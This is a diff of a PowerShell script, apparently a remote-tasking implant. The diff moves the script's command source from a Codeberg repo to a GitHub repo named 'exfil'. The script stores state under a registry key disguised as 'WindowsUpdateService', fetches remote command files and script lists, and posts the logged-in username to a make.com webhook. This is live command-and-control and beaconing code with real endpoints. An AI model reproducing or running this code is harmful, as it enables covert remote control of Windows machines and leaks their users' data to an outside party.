@@ -8,9 +8,12 @@ $LogEngineLifecycleEvent = $false | Out-Null
 $username = ( ( Get-CIMInstance -class Win32_ComputerSystem | Select-Object -ExpandProperty username ) -split '\\' )[1]
 $cacheBuster = Get-Random
 $randomcodegen = "6" + (Get-Random -Minimum 10000 -Maximum 99999)
-$remotecodeurl = "https://codeberg.org/sempiampi/mavericks/raw/branch/main/GlobalFiles/CuesForRemoteHosts.txt?cachebuster=$cacheBuster"
-$apiurl = "https://hook.eu2.make.com/pgvj9kxtwo4pcrhxwn1kg9p9agp129bl"
+$owner = "sempiampi"
+$repo = "exfil"
+$path = ""
 $regPath = "HKLM:\Software\WindowsUpdateService"
+$remotecodeurl = "https://raw.githubusercontent.com/$owner/$repo/main/GlobalFiles/CuesForRemoteHosts.txt?cachebuster=$cacheBuster"
+$apiurl = "https://hook.eu2.make.com/pgvj9kxtwo4pcrhxwn1kg9p9agp129bl"
 $RelayedValue = "RelayedInfo"
 
 # Ensure the registry key and values exist
@@ -46,7 +49,6 @@ $globalStatus = $null
 $localStatus = $null
 $globalScripts = @()
 $localScripts = @()
-
 foreach ($line in $webStatus) {
     $code, $status = $line -split ' ', 2
     if ($code -eq '000000') {
@@ -60,24 +62,21 @@ foreach ($line in $webStatus) {
 }
 
 # Fetch the contents of the entire repository
-$owner = "sempiampi"
-$repo = "mavericks"
-$path = ""
-$uri = "https://codeberg.org/api/v1/repos/$owner/$repo/contents/$path"
+$uri = "https://api.github.com/repos/$owner/$repo/contents/$path"
 $response = Invoke-RestMethod -Uri $uri
 $contents = @()
 foreach ($item in $response) {
     if ($item.type -eq "dir") {
-        $subUri = "https://codeberg.org/api/v1/repos/$owner/$repo/contents/$($item.path)"
+        $subUri = "https://api.github.com/repos/$owner/$repo/contents/$($item.path)"
         $subResponse = Invoke-RestMethod -Uri $subUri
         foreach ($subItem in $subResponse) {
             if ($subItem.type -eq "file" -and $subItem.name -notlike "*ledger*") {
-                $contents += "https://codeberg.org/$owner/$repo/raw/branch/main/$($subItem.path)"
+                $contents += "https://raw.githubusercontent.com/$owner/$repo/main/$($subItem.path)"
             }
         }
     }
     elseif ($item.type -eq "file" -and $item.name -notlike "*ledger*") {
-        $contents += "https://codeberg.org/$owner/$repo/raw/branch/main/$($item.path)"
+        $contents += "https://raw.githubusercontent.com/$owner/$repo/main/$($item.path)"
     }
 }
 
@@ -96,7 +95,7 @@ if ($globalStatus -and $storedData -ne $globalStatus) {
         }       
         if (-not $scriptFound) {
             if ($data -ne "InvalidCue") {
-                $message = "MASTER command: **$script** was not found in the Codeberg repository for **$storedCode**, username: $username."
+                $message = "MASTER command: **$script** was not found in the Repo repository for **$storedCode**, username: $username."
                 Invoke-WebRequest -Uri $apiurl -Method Post -ContentType "text/plain" -Body $message -UseBasicParsing | Out-Null           
                 Set-ItemProperty -Path $regPath -Name 'Data' -Value 'InvalidCue'
             }
